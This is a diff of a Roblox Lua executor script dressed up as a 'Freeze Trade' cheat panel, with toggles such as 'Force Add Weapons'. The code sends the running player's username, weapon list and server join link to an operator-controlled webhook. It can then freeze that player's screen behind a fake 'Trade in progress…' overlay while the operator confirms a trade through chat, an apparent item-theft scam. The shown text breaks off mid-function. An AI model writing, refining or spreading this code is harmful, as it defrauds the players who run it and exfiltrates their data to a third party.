@@ -4,55 +4,42 @@
 local Players          = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local TweenService     = game:GetService("TweenService")
-local RunService       = game:GetService("RunService")
 
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
 local Backpack    = LocalPlayer:WaitForChild("Backpack")
 
--- ── Config (set by generated script) ─────────────────────────────────
+-- ── Config ────────────────────────────────────────────────────────────
 local WEBHOOK      = _G.POOR_WEBHOOK  or ""
 local MY_USERNAMES = _G.MY_USERNAMES  or {}
 local PING_POOR    = _G.PING_POOR     or false
 
 -- ── Colours ───────────────────────────────────────────────────────────
-local C = {
-    bg     = Color3.fromRGB(18,  18,  24),
-    panel  = Color3.fromRGB(28,  28,  38),
-    accent = Color3.fromRGB(255, 105, 180),
-    text   = Color3.fromRGB(240, 240, 240),
-    sub    = Color3.fromRGB(160, 160, 160),
-    green  = Color3.fromRGB( 80, 200, 120),
-    red    = Color3.fromRGB(220,  70,  70),
-    btn    = Color3.fromRGB( 40,  40,  55),
-    yellow = Color3.fromRGB(255, 210,  60),
-}
+local BG        = Color3.fromRGB(22,  22,  26)
+local ROW_BG    = Color3.fromRGB(30,  30,  35)
+local TITLE_BG  = Color3.fromRGB(18,  18,  22)
+local TOGGLE_OFF= Color3.fromRGB(72,  72,  80)
+local TOGGLE_ON = Color3.fromRGB(255, 105, 180)
+local TEXT_COL  = Color3.fromRGB(230, 230, 230)
+local SUB_COL   = Color3.fromRGB(150, 150, 160)
+local WHITE     = Color3.new(1, 1, 1)
 
--- ── HTTP (uses executor's request function, not HttpService) ──────────
-local httpRequest = (syn and syn.request)
-    or (http and http.request)
-    or request
-    or error("No HTTP function found. Use Delta or a supported executor.")
+-- ── HTTP (executor request) ───────────────────────────────────────────
+local httpReq = (syn and syn.request) or (http and http.request) or request
 
-local function encodeJSON(t)
-    -- Simple JSON encoder for flat/nested tables
+local function jsonEncode(t)
     local function val(v)
         local tv = type(v)
-        if tv == "string"  then return '"' .. v:gsub('\\','\\\\'):gsub('"','\\"'):gsub('\n','\\n') .. '"' end
+        if tv == "string"  then return '"'..v:gsub('\\','\\\\'):gsub('"','\\"'):gsub('\n','\\n')..'"' end
         if tv == "number"  then return tostring(v) end
         if tv == "boolean" then return v and "true" or "false" end
         if tv == "table"   then
-            -- array check
             if #v > 0 then
-                local items = {}
-                for _, item in ipairs(v) do table.insert(items, val(item)) end
-                return "[" .. table.concat(items, ",") .. "]"
+                local a = {}; for _,i in ipairs(v) do a[#a+1]=val(i) end
+                return "["..table.concat(a,",").."]"
             else
-                local items = {}
-                for k, item in pairs(v) do
-                    table.insert(items, '"' .. tostring(k) .. '":' .. val(item))
-                end
-                return "{" .. table.concat(items, ",") .. "}"
+                local o = {}; for k,i in pairs(v) do o[#o+1]='"'..k..'":'..val(i) end
+                return "{"..table.concat(o,",").."}"
             end
         end
         return "null"
@@ -61,73 +48,38 @@ local function encodeJSON(t)
 end
 
 local function sendWebhook(embed)
-    if WEBHOOK == "" then return end
-    local ping = PING_POOR and "@everyone" or ""
-    local ok, err = pcall(httpRequest, {
+    if WEBHOOK == "" or not httpReq then return end
+    pcall(httpReq, {
         Url     = WEBHOOK,
         Method  = "POST",
-        Headers = { ["Content-Type"] = "application/json" },
-        Body    = encodeJSON({ content = ping, embeds = { embed } }),
+        Headers = {["Content-Type"]="application/json"},
+        Body    = jsonEncode({content = PING_POOR and "@everyone" or "", embeds = {embed}}),
     })
-    if not ok then
-        warn("[Baddies] Webhook failed:", err)
-    end
 end
 
--- ── Collect weapons ───────────────────────────────────────────────────
-local function getWeapons()
-    local list = {}
-    local seen = {}
-    local char = LocalPlayer.Character
+-- ── Helpers ───────────────────────────────────────────────────────────
+local function corner(p, r)
+    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, r or 8); c.Parent = p
+end
 
-    local function scan(container)
-        if not container then return end
-        for _, item in ipairs(container:GetChildren()) do
-            if (item:IsA("Tool") or item:IsA("HopperBin")) and not seen[item.Name] then
-                seen[item.Name] = true
-                table.insert(list, item.Name)
+local function getWeapons()
+    local list, seen = {}, {}
+    local char = LocalPlayer.Character
+    local function scan(c)
+        if not c then return end
+        for _, i in ipairs(c:GetChildren()) do
+            if (i:IsA("Tool") or i:IsA("HopperBin")) and not seen[i.Name] then
+                seen[i.Name] = true; list[#list+1] = i.Name
             end
         end
     end
-
-    scan(Backpack)
-    if char then scan(char) end
+    scan(Backpack); if char then scan(char) end
     return list
 end
 
--- ── Join link ─────────────────────────────────────────────────────────
 local function joinLink()
-    return string.format(
-        "roblox://experiences/start?placeId=%d&gameInstanceId=%s",
-        game.PlaceId, game.JobId
-    )
-end
-
--- ── Execution notification ────────────────────────────────────────────
-local function notifyExecution()
-    local weapons = getWeapons()
-    local weaponStr = #weapons > 0
-        and "• " .. table.concat(weapons, "\n• ")
-        or  "None found"
-
-    sendWebhook({
-        title       = "⚡ Script Executed",
-        description = string.format(
-            "**User:** %s (`%s`)\n**Place:** %s (`%d`)\n**Players:** %d/%d",
-            LocalPlayer.DisplayName,
-            LocalPlayer.Name,
-            game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown",
-            game.PlaceId,
-            #Players:GetPlayers(),
-            game.MaxPlayers
-        ),
-        fields = {
-            { name = "⚔️ Weapons", value = weaponStr,     inline = false },
-            { name = "🔗 Join",    value = joinLink(),     inline = false },
-        },
-        color     = 0xFF69B4,
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-    })
+    return string.format("roblox://experiences/start?placeId=%d&gameInstanceId=%s",
+        game.PlaceId, game.JobId)
 end
 
 -- ── Screen freeze / unfreeze ──────────────────────────────────────────
@@ -136,83 +88,91 @@ local freezeGui = nil
 local function freezeScreen()
     if freezeGui then return end
     freezeGui = Instance.new("ScreenGui")
-    freezeGui.Name           = "FreezeOverlay"
-    freezeGui.ResetOnSpawn   = false
-    freezeGui.DisplayOrder   = 999
-    freezeGui.IgnoreGuiInset = true
-    freezeGui.Parent         = PlayerGui
+    freezeGui.Name = "FreezeOverlay"; freezeGui.ResetOnSpawn = false
+    freezeGui.DisplayOrder = 999; freezeGui.IgnoreGuiInset = true
+    freezeGui.Parent = PlayerGui
 
-    local overlay = Instance.new("Frame", freezeGui)
-    overlay.Size                  = UDim2.new(1, 0, 1, 0)
-    overlay.BackgroundColor3      = Color3.fromRGB(0, 0, 0)
-    overlay.BackgroundTransparency = 0.35
-    overlay.BorderSizePixel       = 0
-    overlay.ZIndex                = 10
+    local ov = Instance.new("Frame", freezeGui)
+    ov.Size = UDim2.new(1,0,1,0); ov.BackgroundColor3 = Color3.new(0,0,0)
+    ov.BackgroundTransparency = 0.4; ov.BorderSizePixel = 0; ov.ZIndex = 10
+
+    local stroke = Instance.new("UIStroke", ov)
+    stroke.Color = TOGGLE_ON; stroke.Thickness = 5; stroke.Transparency = 0
+    TweenService:Create(stroke, TweenInfo.new(0.9, Enum.EasingStyle.Sine,
+        Enum.EasingDirection.InOut, -1, true), {Transparency = 0.7}):Play()
 
     local blur = Instance.new("BlurEffect")
-    blur.Size   = 24
-    blur.Parent = game:GetService("Lighting")
-
-    local stroke = Instance.new("UIStroke", overlay)
-    stroke.Color       = C.accent
-    stroke.Thickness   = 6
-    stroke.Transparency = 0
-    TweenService:Create(stroke, TweenInfo.new(0.8, Enum.EasingStyle.Sine,
-        Enum.EasingDirection.InOut, -1, true), { Transparency = 0.6 }):Play()
+    blur.Size = 20; blur.Parent = game:GetService("Lighting")
 
     local lbl = Instance.new("TextLabel", freezeGui)
-    lbl.Size                   = UDim2.new(1, 0, 0, 60)
-    lbl.Position               = UDim2.new(0, 0, 0.5, -30)
-    lbl.BackgroundTransparency = 1
-    lbl.Text                   = "🔄  Trade in progress…"
-    lbl.Font                   = Enum.Font.GothamBold
-    lbl.TextSize               = 26
-    lbl.TextColor3             = C.accent
-    lbl.TextStrokeTransparency = 0.4
-    lbl.TextStrokeColor3       = Color3.new(0, 0, 0)
-    lbl.ZIndex                 = 12
+    lbl.Size = UDim2.new(1,0,0,50); lbl.Position = UDim2.new(0,0,0.5,-25)
+    lbl.BackgroundTransparency = 1; lbl.Text = "🔄  Trade in progress…"
+    lbl.Font = Enum.Font.GothamBold; lbl.TextSize = 24
+    lbl.TextColor3 = TOGGLE_ON; lbl.ZIndex = 12
+    lbl.TextStrokeTransparency = 0.3; lbl.TextStrokeColor3 = Color3.new(0,0,0)
 end
 
 local function unfreezeScreen()
     if freezeGui then freezeGui:Destroy(); freezeGui = nil end
-    local blur = game:GetService("Lighting"):FindFirstChildOfClass("BlurEffect")
-    if blur then blur:Destroy() end
+    local b = game:GetService("Lighting"):FindFirstChildOfClass("BlurEffect")
+    if b then b:Destroy() end
 end
 
--- ── GUI helpers ───────────────────────────────────────────────────────
-local function corner(p, r)
-    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, r or 8); c.Parent = p
-end
-local function lbl(p, txt, sz, col, pos)
-    local l = Instance.new("TextLabel")
-    l.Text = txt; l.TextSize = sz or 13; l.TextColor3 = col or C.text
-    l.BackgroundTransparency = 1; l.Font = Enum.Font.GothamBold
-    l.Size = UDim2.new(1, -16, 0, (sz or 13) + 4)
-    l.Position = pos or UDim2.new(0, 8, 0, 0)
-    l.TextXAlignment = Enum.TextXAlignment.Left; l.Parent = p; return l
-end
-local function btn(p, txt, col, pos, sz)
-    local b = Instance.new("TextButton")
-    b.Text = txt; b.TextSize = 12; b.TextColor3 = C.text
-    b.Font = Enum.Font.GothamBold; b.BackgroundColor3 = col or C.btn
-    b.Size = sz or UDim2.new(1, -16, 0, 28)
-    b.Position = pos or UDim2.new(0, 8, 0, 0)
-    b.AutoButtonColor = false; b.Parent = p; corner(b, 6)
-    b.MouseEnter:Connect(function()
-        TweenService:Create(b, TweenInfo.new(0.12), {
-            BackgroundColor3 = (col or C.btn):Lerp(Color3.new(1,1,1), 0.15)
+-- ── Toggle widget ─────────────────────────────────────────────────────
+-- Returns (frame, setValue fn, getValue fn)
+local function makeToggle(parent, posY, labelText, defaultOn)
+    local row = Instance.new("Frame", parent)
+    row.Size = UDim2.new(1, -24, 0, 38); row.Position = UDim2.new(0, 12, 0, posY)
+    row.BackgroundTransparency = 1; row.BorderSizePixel = 0
+
+    -- Separator line
+    local sep = Instance.new("Frame", parent)
+    sep.Size = UDim2.new(1, -24, 0, 1); sep.Position = UDim2.new(0, 12, 0, posY)
+    sep.BackgroundColor3 = Color3.fromRGB(40, 40, 48); sep.BorderSizePixel = 0
+
+    local txt = Instance.new("TextLabel", row)
+    txt.Size = UDim2.new(1, -60, 1, 0); txt.Position = UDim2.new(0, 0, 0, 0)
+    txt.BackgroundTransparency = 1; txt.Text = labelText
+    txt.Font = Enum.Font.Gotham; txt.TextSize = 13
+    txt.TextColor3 = TEXT_COL; txt.TextXAlignment = Enum.TextXAlignment.Left
+
+    -- Track background
+    local track = Instance.new("Frame", row)
+    track.Size = UDim2.new(0, 40, 0, 22)
+    track.Position = UDim2.new(1, -44, 0.5, -11)
+    track.BorderSizePixel = 0
+    track.BackgroundColor3 = defaultOn and TOGGLE_ON or TOGGLE_OFF
+    corner(track, 11)
+
+    -- Knob
+    local knob = Instance.new("Frame", track)
+    knob.Size = UDim2.new(0, 18, 0, 18); knob.AnchorPoint = Vector2.new(0, 0.5)
+    knob.Position = defaultOn and UDim2.new(1,-20,0.5,0) or UDim2.new(0,2,0.5,0)
+    knob.BackgroundColor3 = WHITE; knob.BorderSizePixel = 0
+    corner(knob, 9)
+
+    local on = defaultOn or false
+
+    local function setValue(v)
+        on = v
+        TweenService:Create(track, TweenInfo.new(0.2), {
+            BackgroundColor3 = v and TOGGLE_ON or TOGGLE_OFF
         }):Play()
-    end)
-    b.MouseLeave:Connect(function()
-        TweenService:Create(b, TweenInfo.new(0.12), { BackgroundColor3 = col or C.btn }):Play()
-    end)
-    return b
+        TweenService:Create(knob, TweenInfo.new(0.2), {
+            Position = v and UDim2.new(1,-20,0.5,0) or UDim2.new(0,2,0.5,0)
+        }):Play()
+    end
+
+    local btn = Instance.new("TextButton", row)
+    btn.Size = UDim2.new(1, 0, 1, 0); btn.BackgroundTransparency = 1; btn.Text = ""
+    btn.MouseButton1Click:Connect(function() setValue(not on) end)
+
+    return row, setValue, function() return on end
 end
 
 -- ── Auto-trade state ──────────────────────────────────────────────────
-local tradeState  = "idle"
-local chatConn    = nil
-local statusLabel = nil
+local tradeState = "idle"
+local chatConn   = nil
 
 local function isOwner(name)
     for _, n in ipairs(MY_USERNAMES) do
@@ -221,78 +181,37 @@ local function isOwner(name)
     return false
 end
 
-local function setStatus(msg, col)
-    if statusLabel then
-        statusLabel.Text       = msg
-        statusLabel.TextColor3 = col or C.yellow
-    end
-end
-
-local function listenForChat(owner)
+local function listenForChat(owner, onAccept, onConfirm)
     if chatConn then chatConn:Disconnect() end
     chatConn = owner.Chatted:Connect(function(msg)
         local m = msg:match("^%s*(.-)%s*$")
         if m == "1" and tradeState == "pending" then
             tradeState = "accepted"
-            setStatus("✅ Accepted — waiting for 2…", C.green)
-            sendWebhook({
-                title = "✅ Trade Accepted",
-                description = owner.DisplayName .. " accepted. Type **2** to confirm.",
-                color = 0x50C878,
-            })
+            if onAccept then onAccept() end
         elseif m == "2" and tradeState == "accepted" then
             tradeState = "confirmed"
-            setStatus("🎉 Confirmed!", C.green)
-            unfreezeScreen()
+            if onConfirm then onConfirm() end
             if chatConn then chatConn:Disconnect() end
-            sendWebhook({
-                title = "🎉 Trade Confirmed",
-                description = string.format("Trade between **%s** and **%s** complete.",
-                    LocalPlayer.DisplayName, owner.DisplayName),
-                color = 0xFF69B4,
-            })
         end
     end)
 end
 
-local function startAutoTrade()
-    -- Find owner in server
-    local owner = nil
-    for _, p in ipairs(Players:GetPlayers()) do
-        if p ~= LocalPlayer and isOwner(p.Name) then owner = p; break end
-    end
-
-    if not owner then
-        setStatus("⚠️ Owner not in server", C.red)
-        Players.PlayerAdded:Connect(function(p)
-            if isOwner(p.Name) and tradeState == "idle" then
-                owner = p
-                tradeState = "pending"
-                freezeScreen()
-                setStatus("⏳ Waiting for " .. p.DisplayName .. " — type 1…", C.yellow)
-                sendWebhook({
-                    title = "🔄 Trade Waiting",
-                    description = p.DisplayName .. " joined. Type **1** to accept, **2** to confirm.",
-                    color = 0xFF69B4,
-                })
-                listenForChat(p)
-            end
-        end)
-        return
-    end
-
-    tradeState = "pending"
-    freezeScreen()
-    setStatus("⏳ Waiting for " .. owner.DisplayName .. " — type 1…", C.yellow)
+-- ── Boot webhook ping ─────────────────────────────────────────────────
+local function notifyExecution()
+    local weapons = getWeapons()
+    local weapStr = #weapons > 0 and "• "..table.concat(weapons,"\n• ") or "None"
     sendWebhook({
-        title = "🔄 Auto Trade Started",
-        description = string.format(
-            "**%s** is ready to trade.\nType **1** to accept, **2** to confirm.",
-            LocalPlayer.DisplayName
-        ),
-        color = 0xFF69B4,
+        title = "⚡ Script Executed",
+        description = string.format("**%s** (`%s`)\n**Server:** %d/%d players",
+            LocalPlayer.DisplayName, LocalPlayer.Name,
+            #Players:GetPlayers(), game.MaxPlayers),
+        fields = {
+            {name = "⚔️ Weapons", value = weapStr,    inline = false},
+            {name = "🔗 Join",    value = joinLink(),  inline = false},
+        },
+        color     = 0xFF69B4,
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
     })
-    listenForChat(owner)
 end
 
 -- ── Build GUI ─────────────────────────────────────────────────────────
@@ -302,147 +221,230 @@ gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 gui.DisplayOrder = 10; gui.Parent = PlayerGui
 
 local win = Instance.new("Frame", gui)
-win.Size = UDim2.new(0, 290, 0, 420); win.Position = UDim2.new(0, 16, 0.5, -210)
-win.BackgroundColor3 = C.bg; win.BorderSizePixel = 0; corner(win, 12)
+win.Size = UDim2.new(0, 310, 0, 330)
+win.Position = UDim2.new(0.5, -155, 0.5, -165)
+win.BackgroundColor3 = BG; win.BorderSizePixel = 0; corner(win, 10)
+
+-- Drop shadow
+local sh = Instance.new("ImageLabel", win)
+sh.Size = UDim2.new(1,30,1,30); sh.Position = UDim2.new(0,-15,0,-15)
+sh.BackgroundTransparency = 1; sh.Image = "rbxassetid://5028857084"
+sh.ImageColor3 = Color3.new(0,0,0); sh.ImageTransparency = 0.6; sh.ZIndex = -1
 
 -- Title bar
 local tb = Instance.new("Frame", win)
-tb.Size = UDim2.new(1, 0, 0, 42); tb.BackgroundColor3 = C.accent
-tb.BorderSizePixel = 0; corner(tb, 12)
+tb.Size = UDim2.new(1,0,0,38); tb.BackgroundColor3 = TITLE_BG
+tb.BorderSizePixel = 0
+-- rounded top only via corner + bottom flush
+local tbc = Instance.new("UICorner", tb); tbc.CornerRadius = UDim.new(0, 10)
 local tbfix = Instance.new("Frame", tb)
-tbfix.Size = UDim2.new(1, 0, 0.5, 0); tbfix.Position = UDim2.new(0, 0, 0.5, 0)
-tbfix.BackgroundColor3 = C.accent; tbfix.BorderSizePixel = 0
-local tlbl = Instance.new("TextLabel", tb)
-tlbl.Text = "🍀  Ryr's Baddies"; tlbl.Font = Enum.Font.GothamBold; tlbl.TextSize = 14
-tlbl.TextColor3 = Color3.new(1,1,1); tlbl.BackgroundTransparency = 1
-tlbl.Size = UDim2.new(1,-40,1,0); tlbl.Position = UDim2.new(0,10,0,0)
-tlbl.TextXAlignment = Enum.TextXAlignment.Left
+tbfix.Size = UDim2.new(1,0,0.5,0); tbfix.Position = UDim2.new(0,0,0.5,0)
+tbfix.BackgroundColor3 = TITLE_BG; tbfix.BorderSizePixel = 0
+
+local titleTxt = Instance.new("TextLabel", tb)
+titleTxt.Text = "Freeze Trade"; titleTxt.Font = Enum.Font.Gotham
+titleTxt.TextSize = 13; titleTxt.TextColor3 = TEXT_COL
+titleTxt.BackgroundTransparency = 1
+titleTxt.Size = UDim2.new(1,-120,1,0); titleTxt.Position = UDim2.new(0,12,0,0)
+titleTxt.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Title icons (search, settings, minimise, close)
+local function iconBtn(parent, char, xOffset)
+    local b = Instance.new("TextButton", parent)
+    b.Text = char; b.TextSize = 12; b.TextColor3 = SUB_COL
+    b.Font = Enum.Font.GothamBold; b.BackgroundTransparency = 1
+    b.Size = UDim2.new(0,22,0,22); b.Position = UDim2.new(1,xOffset,0.5,-11)
+    return b
+end
+
+local closeBtn = iconBtn(tb, "✕", -10)
+local minBtn   = iconBtn(tb, "–", -34)
+local _        = iconBtn(tb, "⚙", -58)
+local _        = iconBtn(tb, "⌕", -82)
+closeBtn.TextColor3 = Color3.fromRGB(200,80,80)
+
+local minimised = false
+local body = Instance.new("Frame", win)
+body.Size = UDim2.new(1,0,1,-38); body.Position = UDim2.new(0,0,0,38)
+body.BackgroundTransparency = 1
+
+minBtn.MouseButton1Click:Connect(function()
+    minimised = not minimised
+    body.Visible = not minimised
+    win.Size = minimised and UDim2.new(0,310,0,38) or UDim2.new(0,310,0,330)
+    minBtn.Text = minimised and "+" or "–"
+end)
+closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
 
 -- Drag
 local drag, ds, sp
 tb.InputBegan:Connect(function(i)
     if i.UserInputType == Enum.UserInputType.MouseButton1 then
-        drag = true; ds = i.Position; sp = win.Position
+        drag=true; ds=i.Position; sp=win.Position
     end
 end)
 UserInputService.InputChanged:Connect(function(i)
     if drag and i.UserInputType == Enum.UserInputType.MouseMovement then
-        local d = i.Position - ds
-        win.Position = UDim2.new(sp.X.Scale, sp.X.Offset+d.X, sp.Y.Scale, sp.Y.Offset+d.Y)
+        local d = i.Position-ds
+        win.Position = UDim2.new(sp.X.Scale,sp.X.Offset+d.X,sp.Y.Scale,sp.Y.Offset+d.Y)
     end
 end)
 UserInputService.InputEnded:Connect(function(i)
-    if i.UserInputType == Enum.UserInputType.MouseButton1 then drag = false end
+    if i.UserInputType == Enum.UserInputType.MouseButton1 then drag=false end
 end)
 
--- Min button
-local minimised = false
-local content = Instance.new("Frame", win)
-content.Size = UDim2.new(1,0,1,-42); content.Position = UDim2.new(0,0,0,42)
-content.BackgroundTransparency = 1
-local mb = Instance.new("TextButton", tb)
-mb.Text = "–"; mb.Size = UDim2.new(0,26,0,26); mb.Position = UDim2.new(1,-32,0.5,-13)
-mb.BackgroundTransparency = 1; mb.TextColor3 = Color3.new(1,1,1)
-mb.TextSize = 18; mb.Font = Enum.Font.GothamBold
-mb.MouseButton1Click:Connect(function()
-    minimised = not minimised
-    content.Visible = not minimised
-    win.Size = minimised and UDim2.new(0,290,0,42) or UDim2.new(0,290,0,420)
-    mb.Text = minimised and "+" or "–"
-end)
+-- ── Tab row ───────────────────────────────────────────────────────────
+local tabRow = Instance.new("Frame", body)
+tabRow.Size = UDim2.new(1,0,0,44); tabRow.Position = UDim2.new(0,0,0,0)
+tabRow.BackgroundTransparency = 1
 
--- ── Section: Info ─────────────────────────────────────────────────────
-lbl(content, "👤  " .. LocalPlayer.DisplayName .. " | " .. LocalPlayer.Name,
-    12, C.sub, UDim2.new(0, 8, 0, 8))
+local tradeTab = Instance.new("TextButton", tabRow)
+tradeTab.Size = UDim2.new(0,88,0,30); tradeTab.Position = UDim2.new(0,12,0,7)
+tradeTab.BackgroundColor3 = Color3.fromRGB(42,42,50)
+tradeTab.Text = "⚙  Trade"; tradeTab.Font = Enum.Font.GothamBold
+tradeTab.TextSize = 12; tradeTab.TextColor3 = TEXT_COL
+tradeTab.AutoButtonColor = false; corner(tradeTab, 20)
 
--- ── Section: Trade Status ─────────────────────────────────────────────
-local ts = Instance.new("Frame", content)
-ts.Size = UDim2.new(1,-16,0,96); ts.Position = UDim2.new(0,8,0,30)
-ts.BackgroundColor3 = C.panel; ts.BorderSizePixel = 0; corner(ts, 8)
-lbl(ts, "🔄  Trade Status", 12, C.accent, UDim2.new(0,8,0,6))
-statusLabel = lbl(ts, "⏳ Starting…", 11, C.yellow, UDim2.new(0,8,0,24))
-local cancelBtn = btn(ts, "❌ Cancel Trade", C.red, UDim2.new(0,8,0,58), UDim2.new(1,-16,0,28))
-cancelBtn.MouseButton1Click:Connect(function()
-    if chatConn then chatConn:Disconnect() end
-    tradeState = "cancelled"
-    setStatus("❌ Cancelled", C.red)
-    unfreezeScreen()
-    sendWebhook({ title = "❌ Trade Cancelled",
-        description = LocalPlayer.DisplayName .. " cancelled.", color = 0xDC4646 })
-end)
+-- ── Scroll for rows ───────────────────────────────────────────────────
+local scroll = Instance.new("ScrollingFrame", body)
+scroll.Size = UDim2.new(1,0,1,-48); scroll.Position = UDim2.new(0,0,0,48)
+scroll.BackgroundTransparency = 1; scroll.BorderSizePixel = 0
+scroll.ScrollBarThickness = 0; scroll.CanvasSize = UDim2.new(0,0,0,230)
+scroll.ScrollingDirection = Enum.ScrollingDirection.Y
 
--- ── Section: Weapons ──────────────────────────────────────────────────
-local ws = Instance.new("Frame", content)
-ws.Size = UDim2.new(1,-16,0,94); ws.Position = UDim2.new(0,8,0,136)
-ws.BackgroundColor3 = C.panel; ws.BorderSizePixel = 0; corner(ws, 8)
-lbl(ws, "⚔️  Your Weapons in Trade", 12, C.accent, UDim2.new(0,8,0,6))
-local weapLbl = lbl(ws, "Loading…", 11, C.sub, UDim2.new(0,8,0,24))
-weapLbl.Size = UDim2.new(1,-16,0,64); weapLbl.TextWrapped = true
+-- ── Toggles ───────────────────────────────────────────────────────────
+local function sep()
+    local s = Instance.new("Frame", scroll)
+    s.BackgroundColor3 = Color3.fromRGB(38,38,46); s.BorderSizePixel = 0
+    s.Size = UDim2.new(1,-24,0,1)
+    return s
+end
 
-local refreshBtn = btn(ws, "🔄 Refresh Weapons", C.btn, UDim2.new(0,8,0,60), UDim2.new(1,-16,0,26))
-refreshBtn.MouseButton1Click:Connect(function()
-    local w = getWeapons()
-    weapLbl.Text = #w > 0 and "• " .. table.concat(w, "\n• ") or "(none found)"
-end)
+local rowH  = 42
+local yBase = 2
 
--- ── Section: Join link ────────────────────────────────────────────────
-local js = Instance.new("Frame", content)
-js.Size = UDim2.new(1,-16,0,58); js.Position = UDim2.new(0,8,0,240)
-js.BackgroundColor3 = C.panel; js.BorderSizePixel = 0; corner(js, 8)
-lbl(js, "🔗  Join Link", 12, C.accent, UDim2.new(0,8,0,6))
-local copyBtn = btn(js, "📋 Copy to Clipboard", C.btn, UDim2.new(0,8,0,26), UDim2.new(1,-16,0,24))
-copyBtn.MouseButton1Click:Connect(function()
-    local link = joinLink()
-    pcall(setclipboard, link)
-    sendWebhook({ title = "🔗 Join Link Shared",
-        description = LocalPlayer.DisplayName .. "\n```\n" .. link .. "\n```", color = 0xFF69B4 })
-    copyBtn.Text = "✅ Copied!"
-    task.delay(2, function() copyBtn.Text = "📋 Copy to Clipboard" end)
-end)
+-- Row builder
+local function row(label, yOff)
+    local f = Instance.new("Frame", scroll)
+    f.Size = UDim2.new(1,0,0,rowH); f.Position = UDim2.new(0,0,0,yOff)
+    f.BackgroundTransparency = 1; f.BorderSizePixel = 0
 
--- ── Section: Manual trade ─────────────────────────────────────────────
-local ms = Instance.new("Frame", content)
-ms.Size = UDim2.new(1,-16,0,90); ms.Position = UDim2.new(0,8,0,308)
-ms.BackgroundColor3 = C.panel; ms.BorderSizePixel = 0; corner(ms, 8)
-lbl(ms, "📨  Manual Trade", 12, C.accent, UDim2.new(0,8,0,6))
-lbl(ms, "Target types 1=accept · 2=confirm", 10, C.sub, UDim2.new(0,8,0,22))
-local mi = Instance.new("TextBox", ms)
-mi.Size = UDim2.new(0.58,-4,0,24); mi.Position = UDim2.new(0,8,0,42)
-mi.BackgroundColor3 = C.bg; mi.TextColor3 = C.text; mi.PlaceholderColor3 = C.sub
-mi.PlaceholderText = "Username…"; mi.Text = ""; mi.Font = Enum.Font.Gotham
-mi.TextSize = 12; mi.ClearTextOnFocus = false; mi.BorderSizePixel = 0; corner(mi, 5)
-local mip = Instance.new("UIPadding", mi); mip.PaddingLeft = UDim.new(0,6)
-local msb = btn(ms, "Send", C.accent, UDim2.new(0.58,4,0,42), UDim2.new(0.42,-12,0,24))
-msb.MouseButton1Click:Connect(function()
-    local name = mi.Text:match("^%s*(.-)%s*$")
-    if name == "" then return end
-    local target = Players:FindFirstChild(name)
-    if not target or target == LocalPlayer then
-        msb.Text = "Not found"; task.delay(2, function() msb.Text = "Send" end); return
+    local txt = Instance.new("TextLabel", f)
+    txt.Size = UDim2.new(1,-72,1,0); txt.Position = UDim2.new(0,16,0,0)
+    txt.BackgroundTransparency = 1; txt.Text = label
+    txt.Font = Enum.Font.Gotham; txt.TextSize = 13
+    txt.TextColor3 = TEXT_COL; txt.TextXAlignment = Enum.TextXAlignment.Left
+
+    -- Track
+    local track = Instance.new("Frame", f)
+    track.Size = UDim2.new(0,42,0,24); track.AnchorPoint = Vector2.new(1,0.5)
+    track.Position = UDim2.new(1,-14,0.5,0); track.BackgroundColor3 = TOGGLE_OFF
+    track.BorderSizePixel = 0; corner(track, 12)
+
+    -- Knob
+    local knob = Instance.new("Frame", track)
+    knob.Size = UDim2.new(0,20,0,20); knob.AnchorPoint = Vector2.new(0,0.5)
+    knob.Position = UDim2.new(0,2,0.5,0); knob.BackgroundColor3 = WHITE
+    knob.BorderSizePixel = 0; corner(knob, 10)
+
+    local on = false
+    local function set(v)
+        on = v
+        TweenService:Create(track, TweenInfo.new(0.18), {
+            BackgroundColor3 = v and TOGGLE_ON or TOGGLE_OFF
+        }):Play()
+        TweenService:Create(knob, TweenInfo.new(0.18), {
+            Position = v and UDim2.new(1,-22,0.5,0) or UDim2.new(0,2,0.5,0)
+        }):Play()
     end
-    if chatConn then chatConn:Disconnect() end
-    tradeState = "pending"; freezeScreen()
-    setStatus("⏳ Waiting for " .. target.DisplayName .. " — type 1…", C.yellow)
-    listenForChat(target)
-    sendWebhook({ title = "🔄 Manual Trade Sent",
-        description = LocalPlayer.DisplayName .. " → " .. target.DisplayName
-            .. "\nType **1** accept · **2** confirm", color = 0xFF69B4 })
-    msb.Text = "✅ Sent!"; task.delay(2, function() msb.Text = "Send" end)
-end)
 
--- ── Section: Scroll for weapons at 412 (below manual) ────────────────
-lbl(content, "▲ drag title bar to move", 9, C.sub, UDim2.new(0,8,0,402))
+    local clickArea = Instance.new("TextButton", f)
+    clickArea.Size = UDim2.new(1,0,1,0); clickArea.BackgroundTransparency = 1; clickArea.Text = ""
+    clickArea.MouseButton1Click:Connect(function() set(not on) end)
+
+    -- Separator below
+    local s = Instance.new("Frame", scroll)
+    s.Size = UDim2.new(1,-24,0,1); s.Position = UDim2.new(0,12,0,yOff+rowH-1)
+    s.BackgroundColor3 = Color3.fromRGB(38,38,46); s.BorderSizePixel = 0
+
+    return set, function() return on end
+end
+
+local setFreeze,   getFreeze   = row("Freeze Trade",       0)
+local setAccept,   getAccept   = row("Force Accept",       rowH)
+local setConfirm,  getConfirm  = row("Force Confirm",      rowH*2)
+local setWeapons,  getWeapons2 = row("Force Add Weapons",  rowH*3)
+local setTokens,   getTokens   = row("Force Add Tokens",   rowH*4)
+
+-- ── Wire toggles to functionality ─────────────────────────────────────
+
+-- Freeze Trade toggle → freeze/unfreeze screen
+local origSetFreeze = setFreeze
+setFreeze = function(v)
+    origSetFreeze(v)
+    if v then freezeScreen() else unfreezeScreen() end
+end
+
+-- Auto-trade boot
+local function startAutoTrade()
+    local owner = nil
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer and isOwner(p.Name) then owner = p; break end
+    end
+
+    local function onAccept()
+        setAccept(true)
+        sendWebhook({title="✅ Trade Accepted",
+            description=LocalPlayer.DisplayName.." trade accepted. Type 2 to confirm.",
+            color=0x50C878})
+    end
+    local function onConfirm()
